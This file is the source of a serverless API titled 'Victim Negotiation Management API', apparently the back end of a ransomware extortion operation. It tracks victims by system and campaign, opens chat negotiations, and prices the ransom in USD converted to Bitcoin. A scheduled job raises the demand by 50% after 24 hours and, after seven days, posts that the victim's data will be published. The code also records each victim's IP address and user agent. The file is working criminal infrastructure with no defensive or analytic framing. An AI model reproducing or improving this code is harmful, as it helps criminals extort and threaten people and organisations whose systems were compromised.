// vercel-dashboard/api/negotiations/index.js
// Victim Negotiation Management API

import { kv } from '../../lib/kv.js';

export default async function handler(request, response) {
  response.setHeader('Access-Control-Allow-Origin', '*');
  response.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS');
  response.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Negotiation-Token');

  if (request.method === 'OPTIONS') return response.status(200).end();

  try {
    switch (request.method) {
      case 'GET':
        return await handleGet(request, response);
      case 'POST':
        return await handlePost(request, response);
      case 'PUT':
        return await handlePut(request, response);
      default:
        return response.status(405).json({ error: 'Method not allowed' });
    }
  } catch (error) {
    console.error('Negotiations API error:', error);
    return response.status(500).json({ error: 'Internal server error' });
  }
}

// GET /api/negotiations - List or get negotiation
async function handleGet(request, response) {
  const { id, systemId, status, limit = 50, offset = 0, includeMessages } = request.query;
  const auth = await verifyAuth(request);

  if (id) {
    const negotiation = await kv.get(`negotiation:${id}`);
    if (!negotiation) return response.status(404).json({ error: 'Negotiation not found' });

    // Check access
    if (!auth.isAdmin && negotiation.victimToken !== request.headers['x-negotiation-token']) {
      return response.status(403).json({ error: 'Forbidden' });
    }

    if (includeMessages === 'true') {
      const messageIds = await kv.lrange(`negotiation:${id}:messages`, 0, -1) || [];
      const messages = [];
      for (const mid of messageIds) {
        const msg = await kv.get(`negotiation_message:${mid}`);
        if (msg) messages.push(msg);
      }
      negotiation.messages = messages.reverse();
    }

    return response.json(negotiation);
  }

  // List negotiations (admin only)
  if (!auth.isAdmin) {
    return response.status(403).json({ error: 'Admin access required' });
  }

  let negotiationIds = await kv.smembers('global:negotiations') || [];

  if (systemId) {
    const sysNegotiations = await kv.smembers(`system:${systemId}:negotiations`) || [];
    negotiationIds = negotiationIds.filter(id => sysNegotiations.includes(id));
  }

  if (status) {
    const filtered = [];
    for (const nid of negotiationIds) {
      const n = await kv.get(`negotiation:${nid}`);
      if (n && n.status === status) filtered.push(nid);
    }
    negotiationIds = filtered;
  }

  // Sort by updated date (newest first)
  const withTime = [];
  for (const nid of negotiationIds) {
    const n = await kv.get(`negotiation:${nid}`);
    if (n) withTime.push({ id: nid, updatedAt: n.updatedAt || n.createdAt });
  }
  withTime.sort((a, b) => new Date(b.updatedAt) - new Date(a.updatedAt));

  const start = parseInt(offset);
  const lim = parseInt(limit);
  const paginatedIds = withTime.slice(start, start + lim).map(n => n.id);

  const negotiations = [];
  for (const nid of paginatedIds) {
    const n = await kv.get(`negotiation:${nid}`);
    if (n) {
      const msgCount = await kv.llen(`negotiation:${nid}:messages`) || 0;
      negotiations.push({
        ...n,
        messageCount: msgCount,
        lastMessageAt: n.messages?.[n.messages.length - 1]?.createdAt || null
      });
    }
  }

  response.json({
    negotiations,
    total: negotiationIds.length,
    page: Math.floor(start / lim) + 1,
    pageSize: lim
  });
}

// POST /api/negotiations - Create negotiation (victim initiates) or send message
async function handlePost(request, response) {
  const { action, negotiationId, systemId, message, fileId, fileType } = request.body;
  const victimToken = request.headers['x-negotiation-token'];

  if (action === 'send_message') {
    return await sendMessage(request, response, negotiationId, victimToken, message, fileId, fileType);
  }

  // Create new negotiation (victim initiates)
  if (!systemId) return response.status(400).json({ error: 'System ID required' });

  // Verify system exists
  const system = await kv.get(`system:${systemId}`);
  if (!system) return response.status(404).json({ error: 'System not found' });

  // Check if negotiation already exists for this system
  const existingIds = await kv.smembers(`system:${systemId}:negotiations`) || [];
  for (const eid of existingIds) {
    const existing = await kv.get(`negotiation:${eid}`);
    if (existing && ['open', 'active'].includes(existing.status)) {
      // Return existing negotiation with victim token
      return response.json({
        ...existing,
        victimToken: existing.victimToken,
        isExisting: true
      });
    }
  }

  const id = `neg_${Date.now()}_${Math.random().toString(36).substring(7)}`;
  const victimTokenNew = `vt_${Math.random().toString(36).substring(2, 20)}`;
  const adminToken = `at_${Math.random().toString(36).substring(2, 20)}`;
  const now = new Date().toISOString();

  // Calculate deadlines
  const initialDeadline = new Date(Date.now() + 72 * 60 * 60 * 1000); // 72 hours
  const priceIncreaseDeadline = new Date(Date.now() + 24 * 60 * 60 * 1000); // 24 hours

  const negotiation = {
    id,
    systemId,
    campaignId: system.campaignId,
    victimId: system.victimId,
    victimToken: victimTokenNew,
    adminToken,
    status: 'open', // open, active, stalled, completed, cancelled, expired
    initialRansom: system.ransomAmount || 5000, // USD
    currentRansom: system.ransomAmount || 5000,
    currency: 'USD',
    cryptoCurrency: 'BTC',
    cryptoAmount: 0, // Calculated at payment time
    messages: [],
    messageCount: 0,
    unreadAdmin: 0,
    unreadVictim: 0,
    createdAt: now,
    updatedAt: now,
    lastMessageAt: null,
    lastVictimMessageAt: null,
    lastAdminMessageAt: null,
    deadlines: {
      initial: initialDeadline.toISOString(),
      priceIncrease: priceIncreaseDeadline.toISOString(),
      final: new Date(Date.now() + 168 * 60 * 60 * 1000).toISOString() // 7 days
    },
    priceIncreasePercent: 50, // 50% increase after 24h
    proofFiles: [],
    decryptionProof: null,
    agreedAmount: null,
    agreedCryptoAmount: null,
    paymentTxHash: null,
    completedAt: null,
    metadata: {
      victimIP: request.headers['x-forwarded-for']?.split(',')[0]?.trim() || request.headers['x-real-ip'],
      victimUserAgent: request.headers['user-agent'],
      ransomNoteId: system.ransomNoteId
    }
  };

  // Calculate initial crypto amount
  negotiation.cryptoAmount = await calculateCryptoAmount(negotiation.currentRansom, negotiation.cryptoCurrency);

  const operations = [
    kv.set(`negotiation:${id}`, negotiation),
    kv.sadd('global:negotiations', id),
    kv.sadd(`system:${systemId}:negotiations`, id),
    kv.sadd(`campaign:${system.campaignId}:negotiations`, id)
  ];

  // Add system message
  const systemMsg = await createMessage(id, 'system', 'Negotiation started. You have 72 hours to respond before data publication.', now, true);
  operations.push(
    kv.lpush(`negotiation:${id}:messages`, systemMsg.id),
    kv.set(`negotiation_message:${systemMsg.id}`, systemMsg)
  );

  await Promise.all(operations);

  // Return with victim token for chat access
  response.status(201).json({
    ...negotiation,
    victimToken: victimTokenNew,
    isExisting: false
  });
}

// PUT /api/negotiations - Admin actions: update status, ransom, send message
async function handlePut(request, response) {
  const auth = await verifyAuth(request);
  if (!auth.isAdmin) return response.status(403).json({ error: 'Admin access required' });

  const { id, action, ...updates } = request.body;
  if (!id) return response.status(400).json({ error: 'Negotiation ID required' });

  const negotiation = await kv.get(`negotiation:${id}`);
  if (!negotiation) return response.status(404).json({ error: 'Negotiation not found' });

  const now = new Date().toISOString();
  let updated = { ...negotiation, ...updates, updatedAt: now };

  switch (action) {
    case 'send_message':
      if (!updates.message) return response.status(400).json({ error: 'Message required' });
      const adminMsg = await createMessage(id, 'admin', updates.message, now, false, updates.fileId, updates.fileType);
      await Promise.all([
        kv.lpush(`negotiation:${id}:messages`, adminMsg.id),
        kv.set(`negotiation_message:${adminMsg.id}`, adminMsg),
        kv.set(`negotiation:${id}`, { ...updated, lastMessageAt: now, lastAdminMessageAt: now, unreadVictim: updated.unreadVictim + 1, status: updated.status === 'open' ? 'active' : updated.status })
      ]);
      updated = await kv.get(`negotiation:${id}`);
      break;

    case 'update_ransom':
      if (!updates.newAmount) return response.status(400).json({ error: 'New amount required' });
      updated.currentRansom = parseFloat(updates.newAmount);
      updated.cryptoAmount = await calculateCryptoAmount(updated.currentRansom, updated.cryptoCurrency);
      updated.ransomHistory = negotiation.ransomHistory || [];
      updated.ransomHistory.push({ amount: updated.currentRansom, changedAt: now, changedBy: 'admin' });
      await kv.set(`negotiation:${id}`, updated);
      break;

    case 'update_status':
      if (!updates.status) return response.status(400).json({ error: 'Status required' });
      const validStatuses = ['open', 'active', 'stalled', 'completed', 'cancelled', 'expired'];
      if (!validStatuses.includes(updates.status)) return response.status(400).json({ error: 'Invalid status' });
      
      updated.status = updates.status;
      if (updates.status === 'completed') {
        updated.completedAt = now;
        updated.agreedAmount = updated.currentRansom;
        updated.agreedCryptoAmount = updated.cryptoAmount;
      }
      await kv.set(`negotiation:${id}`, updated);
      break;

    case 'add_proof':
      if (!updates.fileId) return response.status(400).json({ error: 'File ID required' });
      updated.proofFiles = updated.proofFiles || [];
      updated.proofFiles.push({ fileId: updates.fileId, type: updates.fileType || 'decryption_proof', addedAt: now });
      await kv.set(`negotiation:${id}`, updated);
      break;

    case 'set_deadline':
      if (!updates.deadline) return response.status(400).json({ error: 'Deadline required' });
      updated.deadlines = { ...updated.deadlines, ...updates.deadline };
      await kv.set(`negotiation:${id}`, updated);
      break;

    default:
      // Generic update
      await kv.set(`negotiation:${id}`, updated);
  }

  response.json(await kv.get(`negotiation:${id}`));
}

// ============ HELPER FUNCTIONS ============

async function sendMessage(request, response, negotiationId, victimToken, message, fileId, fileType) {
  if (!negotiationId || !victimToken) return response.status(400).json({ error: 'Negotiation ID and victim token required' });
  if (!message && !fileId) return response.status(400).json({ error: 'Message or file required' });

  const negotiation = await kv.get(`negotiation:${negotiationId}`);
  if (!negotiation) return response.status(404).json({ error: 'Negotiation not found' });
  if (negotiation.victimToken !== victimToken) return response.status(403).json({ error: 'Invalid token' });
  if (['completed', 'cancelled', 'expired'].includes(negotiation.status)) {
    return response.status(400).json({ error: 'Negotiation is closed' });
  }

  const now = new Date().toISOString();
  const msg = await createMessage(negotiationId, 'victim', message, now, false, fileId, fileType);

  const updated = {
    ...negotiation,
    lastMessageAt: now,
    lastVictimMessageAt: now,
    unreadAdmin: negotiation.unreadAdmin + 1,
    status: negotiation.status === 'open' ? 'active' : negotiation.status,
    updatedAt: now
  };

  await Promise.all([
    kv.lpush(`negotiation:${negotiationId}:messages`, msg.id),
    kv.set(`negotiation_message:${msg.id}`, msg),
    kv.set(`negotiation:${negotiationId}`, updated)
  ]);

  response.json({ success: true, message: msg, negotiation: updated });
}

async function createMessage(negotiationId, sender, content, timestamp, isSystem, fileId, fileType) {
  const id = `msg_${Date.now()}_${Math.random().toString(36).substring(7)}`;
  const msg = {
    id,
    negotiationId,
    sender, // 'victim', 'admin', 'system'
    content: content || '',
    fileId: fileId || null,
    fileType: fileType || null,
    isSystem: isSystem || false,
    read: false,
    readAt: null,
    createdAt: timestamp,
    metadata: {}
  };
  return msg;
}

async function calculateCryptoAmount(usdAmount, currency) {
  // In production, fetch real-time rates from CoinGecko/CoinMarketCap
  const rates = {
    BTC: 45000,
    ETH: 3000,
    USDT: 1,
    XMR: 150,
    LTC: 100,
    BCH: 300
  };
  const rate = rates[currency] || rates.BTC;
  return parseFloat((usdAmount / rate).toFixed(8));
}

async function verifyAuth(request) {
  const authHeader = request.headers['authorization']?.replace('Bearer ', '');
  const isAdmin = authHeader === process.env.MASTER_API_KEY;
  
  // Also check admin session
  if (!isAdmin && authHeader) {
    const session = await kv.get(`admin_session:${authHeader}`);
    if (session && new Date(session.expiresAt) > new Date()) {
      return { isAdmin: true, adminId: session.adminId };
    }
  }
  
  return { isAdmin };
}

// Background job: Check expired negotiations and price increases
export async function checkNegotiationDeadlines() {
  const negotiationIds = await kv.smembers('global:negotiations') || [];
  const now = new Date();

  for (const nid of negotiationIds) {
    const negotiation = await kv.get(`negotiation:${nid}`);
    if (!negotiation || ['completed', 'cancelled', 'expired'].includes(negotiation.status)) continue;

    // Check price increase deadline
    if (negotiation.deadlines?.priceIncrease && new Date(negotiation.deadlines.priceIncrease) <= now) {
      if (negotiation.status !== 'expired') {
        const newAmount = negotiation.currentRansom * (1 + negotiation.priceIncreasePercent / 100);
        await kv.set(`negotiation:${nid}`, {
          ...negotiation,
          currentRansom: parseFloat(newAmount.toFixed(2)),
          cryptoAmount: await calculateCryptoAmount(newAmount, negotiation.cryptoCurrency),
          priceIncreaseApplied: true,
          updatedAt: new Date().toISOString()
        });

        // Add system message
        const msg = await createMessage(nid, 'system', `Price increased by ${negotiation.priceIncreasePercent}%. New amount: $${newAmount.toLocaleString()}`, new Date().toISOString(), true);
        await kv.lpush(`negotiation:${nid}:messages`, msg.id);
        await kv.set(`negotiation_message:${msg.id}`, msg);
      }
    }

    // Check final deadline
    if (negotiation.deadlines?.final && new Date(negotiation.deadlines.final) <= now) {
      if (!['completed', 'cancelled'].includes(negotiation.status)) {
        await kv.set(`negotiation:${nid}`, {
          ...negotiation,
          status: 'expired',
          updatedAt: new Date().toISOString()
        });

        const msg = await createMessage(nid, 'system', 'Negotiation expired. Data will be published.', new Date().toISOString(), true);
        await kv.lpush(`negotiation:${nid}:messages`, msg.id);
        await kv.set(`negotiation_message:${msg.id}`, msg);
      }
    }
  }
}
